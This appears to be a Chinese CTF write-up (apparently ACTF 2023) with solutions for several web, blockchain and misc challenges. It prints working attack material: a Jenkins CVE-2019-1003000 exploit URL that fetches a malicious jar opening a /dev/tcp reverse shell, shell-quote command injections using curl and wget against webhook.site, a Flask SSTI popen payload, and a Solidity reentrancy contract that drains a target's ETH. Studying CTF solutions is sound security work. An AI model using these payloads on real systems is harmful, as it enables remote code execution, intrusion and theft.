<p><a href="https://www.zzwa.org.cn/4553/">https://www.zzwa.org.cn/4553/</a></p>
<p><a href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p>
<p>参考上面的利用gitlabs搭配完成攻击内网jenkins的操作。</p>
<p>gitlabs上面部署webhooks，然后让hook去访问<a href="http://124.70.33.170:8088/%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%90%BA%E5%B8%A6%E4%BA%86body%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%AB%99%E7%82%B9%E7%BB%99%E5%87%BA%E6%96%B9%E5%BC%8F%E4%B8%8D%E6%94%AF%E6%8C%81%E7%9A%84%E9%94%99%E8%AF%AF%EF%BC%8C%E4%BD%86%E6%98%AFgitlabs%E8%B2%8C%E4%BC%BC%E4%B8%8D%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%B7%E6%B1%82%E6%A0%BC%E5%BC%8F%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E7%94%A8302%E8%B7%B3%E8%BD%AC%E5%8E%BB%E6%B8%85%E7%A9%BA%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%8C%E8%BF%99%E6%A0%B7%E8%AE%BF%E9%97%AE%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B0%B1%E6%98%AFget%E6%96%B9%E5%BC%8F%E3%80%82">http://124.70.33.170:8088/，发现携带了body，导致站点给出方式不支持的错误，但是gitlabs貌似不支持自定义请求格式，所以这里用302跳转去清空请求头，这样访问到页面就是get方式。</a></p>
<p>这时候站点提示让我携带redirect_url参数，测了好久发现用题干给的<a href="http://jenkins:8080/%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E9%A2%98%E7%9B%AE%EF%BC%8C%E5%8F%91%E7%8E%B0%E7%89%88%E6%9C%AC%E5%8F%B7jenkins-2.138%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%89%93cve%EF%BC%9Ahttps://aluvion.github.io/2019/02/26/CVE-2019-1003000%E5%A4%8D%E7%8E%B0/">http://jenkins:8080/就可以直接访问题目，发现版本号jenkins-2.138，直接打cve：https://aluvion.github.io/2019/02/26/CVE-2019-1003000%E5%A4%8D%E7%8E%B0/</a></p>
<p>php开302</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line">header(&quot;Location: &quot;.$_GET[&quot;redirect_url&quot;]);   </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>确保重定向后，后续代码不会被执行   </span><br><span class="line">?<span class="operator">&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>写恶意jar：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>echo Hhhh123 <span class="operator">&gt;</span> META<span class="operator">-</span>INF<span class="operator">/</span>services<span class="operator">/</span>org.codehaus.groovy.plugins.Runners</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>javac  Hhhh123.java</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>jar cvf poc<span class="number">-1.</span>jar .<span class="operator">/</span>Hhhh123.class  .<span class="operator">/</span>META<span class="operator">-</span>INF<span class="operator">/</span></span><br><span class="line">public class Hhhh123 &#123;</span><br><span class="line">    public Hhhh123()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().<span class="keyword">exec</span>(&quot;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>name：什么都可以</p>
<p>root：vps ip</p>
<p>group：a即<a href="https://x.x.x.x/a%E7%9B%AE%E5%BD%95%EF%BC%8Cgroup%E7%94%A8%E4%B8%80%E6%AC%A1%E5%90%8Ejar%E4%BC%9A%E7%BC%93%E5%AD%98%EF%BC%8C%E6%89%80%E4%BB%A5%E6%AF%8F%E6%AC%A1%E5%A4%B1%E8%B4%A5%E9%83%BD%E5%BE%97%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90%E3%80%82">https://x.x.x.x/a目录，group用一次后jar会缓存，所以每次失败都得重新生成。</a></p>
<p>module、version：恶意jar文件的名字，即module-version.jar</p>
<p>最后形成：<a href="http://vpsip:port/hh3/hhhhhh/1/hhhhhh-1.jar">http://vpsip:port/hh3/hhhhhh/1/hhhhhh-1.jar</a></p>
<p>Exp:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>vps:port<span class="operator">/</span>index.php?redirect_url<span class="operator">=</span>http<span class="operator">%</span><span class="number">3</span>A<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2</span>F124<span class="operator">%</span><span class="number">2E70</span><span class="operator">%</span><span class="number">2E33</span><span class="operator">%</span><span class="number">2E170</span><span class="operator">%</span><span class="number">3</span>A8088<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">3</span>Fredirect<span class="operator">%</span><span class="number">5</span>Furl<span class="operator">%</span><span class="number">3</span>Dhttp<span class="operator">%</span><span class="number">3</span>A<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2</span>Fjenkins<span class="operator">%</span><span class="number">3</span>A8080<span class="operator">%</span><span class="number">2</span>FsecurityRealm<span class="operator">%</span><span class="number">2</span>Fuser<span class="operator">%</span><span class="number">2</span>Fadmin<span class="operator">%</span><span class="number">2</span>FdescriptorByName<span class="operator">%</span><span class="number">2</span>Forg<span class="operator">%</span><span class="number">2</span>Ejenkinsci<span class="operator">%</span><span class="number">2</span>Eplugins<span class="operator">%</span><span class="number">2</span>Eworkflow<span class="operator">%</span><span class="number">2</span>Ecps<span class="operator">%</span><span class="number">2</span>ECpsFlowDefinition<span class="operator">%</span><span class="number">2</span>FcheckScriptCompile<span class="operator">%</span><span class="number">3</span>Fvalue<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">2520</span><span class="operator">%</span><span class="number">40</span>GrabConfig<span class="operator">%</span><span class="number">28</span>disableChecksums<span class="operator">%</span><span class="number">3</span>Dtrue<span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">250</span>a<span class="operator">%</span><span class="number">2520</span><span class="operator">%</span><span class="number">40</span>GrabResolver<span class="operator">%</span><span class="number">28</span>name<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">2527</span>orange<span class="operator">%</span><span class="number">2</span>Etw<span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">2520</span>root<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">2527</span>http<span class="operator">%</span><span class="number">3</span>A<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2</span>F139<span class="operator">%</span><span class="number">2E159</span><span class="operator">%</span><span class="number">2E197</span><span class="operator">%</span><span class="number">2E129</span><span class="operator">%</span><span class="number">3</span>A10003<span class="operator">%</span><span class="number">2</span>F<span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">250</span>a<span class="operator">%</span><span class="number">2520</span><span class="operator">%</span><span class="number">40</span>Grab<span class="operator">%</span><span class="number">28</span><span class="keyword">group</span><span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">2527</span>hh3<span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">2520</span><span class="keyword">module</span><span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">2527</span>hhhhhh<span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">2520</span>version<span class="operator">%</span><span class="number">3</span>D<span class="operator">%</span><span class="number">25271</span><span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">250</span>a<span class="operator">%</span><span class="number">2520</span>import<span class="operator">%</span><span class="number">2520</span>Hhhh123<span class="operator">%</span><span class="number">3</span>B<span class="operator">%</span><span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<h3><span id="ave-mujica-s-masquerade">Ave Mujica’s Masquerade</span><a href="#ave-mujica-s-masquerade" class="header-anchor"></a></h3><p>仔细阅读CVE-2021-42740分析文章<a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">curl -T /flag-???????????????? http://webhook.site/&lt;<span class="built_in">id</span>&gt;/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;url&gt;/checker?url=127.0.0.1:`:`wget$IFS\webhook.site/&lt;id&gt;/$IFS\-O$IFS/tmp/s.sh``:`</span><br><span class="line">http:/&lt;url/checker?url=127.0.0.1:`:`sh$IFS\/tmp/s.sh``:`</span><br></pre></td></tr></table></figure>

<h3><span id="mygo">mygo</span><a href="#mygo" class="header-anchor"></a></h3><p>命令注入，简单绕过一些过滤即可。</p>
<p>checker?url&#x3D;:1%0d-iL%09&#x2F;flag-????????????????%09-oN%09&#x2F;dev&#x2F;stdout</p>
<h3><span id="story">story</span><a href="#story" class="header-anchor"></a></h3><p>需要使得vip为true才能进行后续操作，这里需要generate_code等于session中的vip，generate_code</p>
<p>但似乎没找到python预测随机数的办法，爆破显然实现不了，只找到一个可能的实现方法，如下</p>
<p><a href="https://stackoverflow.com/questions/42646039/how-do-i-predict-the-output-of-pythons-random-number-generator">https://stackoverflow.com/questions/42646039/how-do-i-predict-the-output-of-pythons-random-number-generator</a></p>
<p>flask-session不会改变，所以成为一次vip就可以一直使用同一个session</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from story.utils.captcha import Captcha, generate_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    gen = Captcha(200, 80)</span><br><span class="line">    gen.generate()</span><br><span class="line">    captcha = generate_code()</span><br><span class="line"></span><br><span class="line">    requests.get(<span class="string">&quot;http://124.70.33.170:23001/captcha&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;captcha\&quot;:\&quot;&quot;</span> + captcha + <span class="string">&quot;\&quot;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(rawBody)</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://124.70.33.170:23001/vip&quot;</span>, data=rawBody, headers=headers2)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(session.cookies.items())</span><br></pre></td></tr></table></figure>

<p>带上session<code>/write</code>​路由传ssti payload，在&#x2F;story触发ssti，有个waf</p>
<p>发现<code>SECRET_KEY</code>​是写在config里面的，story是从session里面直接获取，直接伪造session即可绕过waf执行ssti rce，所以想办法获取config</p>
<p>waf随机取三条规则，当输入符合这三个规则集其中一条时，返回 False，如果任何一个规则集未被满足，返回 True，不进入下面判断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> not minic_waf(story):</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">    session[<span class="string">&#x27;vip&#x27;</span>] = False</span><br><span class="line">    <span class="built_in">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;no way~~~&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>waf规则中有一条不带有config，由于规则抽取的随机性，当三条规则都为rule6时，config将不再触发waf，所以固定session重放获取<code>SECRET_KEY</code>​</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;story&quot;</span>:<span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>然后伪造session中story ssti rce</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/getsession&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def getsession():</span><br><span class="line">    session[<span class="string">&#x27;story&#x27;</span>]=<span class="string">&quot;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">return</span> session[<span class="string">&#x27;story&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h3><span id="dong-fang-yuan-shen-da-xue">东方原神大学</span><a href="#dong-fang-yuan-shen-da-xue" class="header-anchor"></a></h3><p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc1NzI0YTcyMzFkNjgzYjc3ZWViMWFkMzM1OGQ0NjBfcHdwa2s0b3g1Qm82bm1zRWczQ2xQUnNtUlBTaDNUYkZfVG9rZW46UjZ0OWJxSG5Eb21nWlp4VE03SWM4MWVXbklQXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM1MmE0NWY2YWM1MmM5ZTc4YWJkMzk5M2ZmYWY2MmVfT28xNkFjSVg1SEx6dUdudXpkbFVYYTk5eENaNnVlNk1fVG9rZW46Q24wTmJjYlRFb0JwVXZ4ZnZTcmNPeFNRbm1qXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<h3><span id="viper">Viper</span><a href="#viper" class="header-anchor"></a></h3><p>题目描述</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/1.png" alt="1">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/2.png" alt="2">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/3.png" alt="3">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/4.png" alt="4">​</p>
<p><a href="https://img.seaeye.cn/file/ACTF2023/Viper.zip">题目附件</a></p>
<p>解题思路</p>
<p><strong>这题非常明显地暗示了</strong>​<code>Viper(Vyper)</code>​这一关键词，不难联想到前段时间的<a href="https://curve.fi/">Curve</a>的<a href="https://www.jinse.cn/news/blockchain/3652359.html">重入攻击事件</a>（<a href="https://mp.weixin.qq.com/s?__biz=MzkyNjUxNjU2Mg==&mid=2247483687&idx=1&sn=58153099c034ac14caf9532ed79dbd15&chksm=c237551af540dc0c1695015037243f6eafd7c992be2df8f629455e3c2ec1c92b412a3dc83b8b&mpshare=1&scene=23&srcid=0802tCsLC82V3aInevV5qMmk">事件分析 By ZAN</a>&#x2F;<a href="https://learnblockchain.cn/article/6341">事件分析 By 零时科技</a>），大致情况是<strong>智能合约编程语言</strong>​<a href="https://github.com/vyperlang/vyper">Vyper</a>的<code>0.2.15</code>​、<code>0.2.16</code>​、<code>0.3.0</code>​版本编译器存在<strong>重入锁故障</strong>（即在一笔交易中，两个不同函数的重入锁，并不共享一个锁变量，<strong>导致合约可以被跨函数重入攻击</strong>）。</p>
<p><strong>将题目合约代码</strong>​<code>Viper.vy</code>​转换为等价的<a href="https://github.com/ethereum/solidity">Solidity</a>代码，并删去<code>nonreentrant</code>​修饰器函数以便阅读（删去仅是为了方便理解，实际上单函数自身的重入锁是有效的），得到<code>Viper.sol</code>​如下：</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/5.png" alt="5">​</p>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">重入</a>这一攻击类型也是经常接触到的，我在这里就直接给出<strong>函数调用路径</strong>而不作详细解释了：</p>
<ol start="0">
<li><p><strong>我们的目标是****清空题目合约中的ETH余额</strong>，初始状态下余额为<strong>3 ETH</strong></p>
</li>
<li><p><strong>构造</strong>​<code>receive</code>​函数，在触发重入效果时执行<code>deposit</code>​ <code>coins[1]</code>​操作：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        if (msg.value == 1) &#123;</span><br><span class="line">            uint256 amount = token.balanceOf(address(this));</span><br><span class="line">            target.deposit(1, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>调用</strong>​<code>preSwap</code>​函数，使用<code>msg.value=1 ether(ETH is coins[0])</code>​兑换得到<code>coins[1]</code>​的<code>balances</code>​，同时提前<code>approve</code>​以便后续<code>transferFrom</code>​成功：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function preSwap() external payable &#123;</span><br><span class="line">        target.swap&#123;value: msg.value&#125;(0, 1, msg.value);</span><br><span class="line">        token.approve(address(target), type(uint256).max);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>调用</strong>​<code>hack</code>​函数，循环执行<code>4</code>​次，每次<code>withdraw</code>​所拥有的全部<code>coins[1]</code>​，并且将其<code>swap</code>​为<code>ETH(coins[0])</code>​，同时附带<code>msg.value=1 wei</code>​以便重入到<code>receive</code>​函数时进行识别，在执行<code>4</code>​次循环后我们就有足够的<code>balances[0]</code>​来<code>withdraw</code>​题目合约上所有的<strong>4 ETH(3+1&#x3D;4)</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function hack() external payable &#123;</span><br><span class="line">        uint256 amount = target.balances(1, address(this));</span><br><span class="line">        for (uint i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            target.withdraw(1, amount);</span><br><span class="line">            target.swap&#123;value: msg.value&#125;(1, 0, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        target.withdraw(0, address(target).balance);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>这样我们便能够在不消耗</strong>​<code>coins[1]</code>​的<code>balances</code>​的同时（在重入过程中<code>withdraw</code>​又<code>deposit</code>​，值没有改变），增加了<code>_after</code>​和<code>_before</code>​的差值（在<code>_before</code>​值记录之前就已经<code>withdraw</code>​出来了<code>coins[1]</code>​，而<code>_after</code>​的增量来自于<code>deposit</code>​，这个过程中执行了<code>swap</code>​zhi 之外的<code>transferFrom</code>​）从而增加我们的<code>balances[0]</code>​，<strong>跨函数重入</strong>利用成功。</p>
</li>
</ol>
<p><strong>以下是攻击合约</strong>​<code>Farmer.sol</code>​和解题脚本<code>solve.py</code>​的代码：</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/6.png" alt="6">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Viper.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Farmer &#123;</span><br><span class="line">    ERC20 token = ERC20(address(0x50155B59Bd8BB2740A62E8E8900dac78E94eA22D));</span><br><span class="line">    Viper target =</span><br><span class="line">        Viper(payable(address(0x0A6FA9c756a4a14EC615F3279cA8549fd3650B5B)));</span><br><span class="line"></span><br><span class="line">    function preSwap() external payable &#123;</span><br><span class="line">        target.swap&#123;value: msg.value&#125;(0, 1, msg.value);</span><br><span class="line">        token.approve(address(target), type(uint256).max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() external payable &#123;</span><br><span class="line">        uint256 amount = target.balances(1, address(this));</span><br><span class="line">        for (uint i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            target.withdraw(1, amount);</span><br><span class="line">            target.swap&#123;value: msg.value&#125;(1, 0, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        target.withdraw(0, address(target).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance0() external view returns (uint256) &#123;</span><br><span class="line">        return target.balances(0, address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance1() external view returns (uint256) &#123;</span><br><span class="line">        return target.balances(1, address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return target.isSolved();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (msg.value == 1) &#123;</span><br><span class="line">            uint256 amount = token.balanceOf(address(this));</span><br><span class="line">            target.deposit(1, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from Poseidon.Blockchain import *</span><br><span class="line"></span><br><span class="line">chain = Chain(&quot;http://120.46.58.72:8545&quot;)</span><br><span class="line">account = Account(chain, &quot;&lt;PrivateKey&gt;&quot;)</span><br><span class="line"></span><br><span class="line">abi, bytecode = BlockchainUtils.Compile(&quot;Farmer.sol&quot;, &quot;Farmer&quot;)</span><br><span class="line">contract: Contract = account.DeployContract(abi, bytecode)[&quot;Contract&quot;]</span><br><span class="line"></span><br><span class="line">contract.ReadOnlyCallFunction(&quot;getBalance0&quot;)</span><br><span class="line">contract.ReadOnlyCallFunction(&quot;getBalance1&quot;)</span><br><span class="line">contract.CallFunctionWithParameters(Web3.to_wei(1, &#x27;ether&#x27;), None, 1000000, &quot;preSwap&quot;)</span><br><span class="line">contract.ReadOnlyCallFunction(&quot;getBalance0&quot;)</span><br><span class="line">contract.ReadOnlyCallFunction(&quot;getBalance1&quot;)</span><br><span class="line"></span><br><span class="line">contract.CallFunctionWithParameters(1, None, 1000000, &quot;hack&quot;)</span><br><span class="line">contract.ReadOnlyCallFunction(&quot;isSolved&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://img.seaeye.cn/img/ACTF2023/7.png" alt="7">​</p>
<p><strong>得到****flag</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="amop1">AMOP1</span><a href="#amop1" class="header-anchor"></a></h3><p>题目描述</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/8.png" alt="8">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/9.png" alt="9">​</p>
<p><a href="https://img.seaeye.cn/file/ACTF2023/AMOP1.zip">题目附件</a></p>
<p>解题过程</p>
<p><strong>这题基于****国产联盟链</strong>​<a href="https://github.com/FISCO-BCOS/FISCO-BCOS">FISCO BCOS</a>构建，主要的知识点是<strong>链上信使协议</strong>​<a href="https://fisco-bcos-doc.readthedocs.io/zh-cn/latest/docs/design/amop_protocol.html">AMOP (Advanced Messages Onchain Protocol)</a>，题目描述中给了足够多的提示，只需使用现成的工具连接到题目区块链环境并订阅消息即可。</p>
<p>**下载并构建交互工具（提前安装好 **<code>java 8</code>​ 或以上版本）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FISCO-BCOS/java-sdk-demo.git</span><br><span class="line">cd java-sdk-demo</span><br><span class="line">git checkout origin/main-2.0</span><br><span class="line">./gradlew build</span><br></pre></td></tr></table></figure>

<p><strong>之后修改</strong>​<code>dist/conf/amop/config-subscriber-for-test.toml</code>​中的<code>network</code>​配置项：</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/10.png" alt="10">​</p>
<p><strong>然后将题目附件中的</strong>​<code>ca.crt</code>​、<code>sdk.crt</code>​、<code>sdk.key</code>​、<code>privkey</code>​四个文件移动到<code>dist/conf</code>​目录下：</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/11.png" alt="11">​</p>
<p><strong>最后分别执行下面两条命令，订阅并获取</strong>​<code>公共频道(flag1)</code>​和<code>私有频道(flag2)</code>​的消息：</p>
